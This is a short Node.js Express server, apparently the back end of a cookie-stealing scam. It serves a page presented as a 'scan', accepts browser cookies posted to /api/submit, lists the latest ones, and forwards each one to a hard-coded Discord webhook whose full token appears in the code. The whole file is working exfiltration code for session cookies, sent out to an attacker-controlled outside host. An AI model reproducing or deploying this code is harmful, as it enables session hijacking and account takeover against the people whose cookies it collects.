const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const cookies = [];

// ====== 页面 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 接收Cookie ======
app.post("/api/submit", function(req, res) {
    var cookie = req.body.cookie || "";
    if (!cookie) return res.json({ ok: false });

    cookies.push({
        cookie: cookie,
        time: new Date().toISOString()
    });

    sendToDiscord(cookie);
    res.json({ ok: true });
});

// ====== Cookie列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== 发送Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("端口 " + PORT);
});